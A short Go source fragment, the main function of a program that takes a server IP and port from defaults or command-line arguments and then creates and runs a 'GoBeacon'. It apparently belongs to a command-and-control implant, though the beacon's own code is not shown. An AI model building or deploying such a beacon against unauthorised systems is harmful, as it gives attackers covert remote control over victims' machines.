// Main entry point

func main() {
	serverIP := DefaultServerIP
	serverPort := DefaultServerPort

	// Override with command-line arguments if provided
	if len(os.Args) >= 3 {
		serverIP = os.Args[1]
		if port, err := strconv.Atoi(os.Args[2]); err == nil {
			serverPort = port
		}
	} else if len(os.Args) == 2 {
		serverIP = os.Args[1]
	}

	beacon := NewGoBeacon(serverIP, serverPort)
	beacon.Run()
}
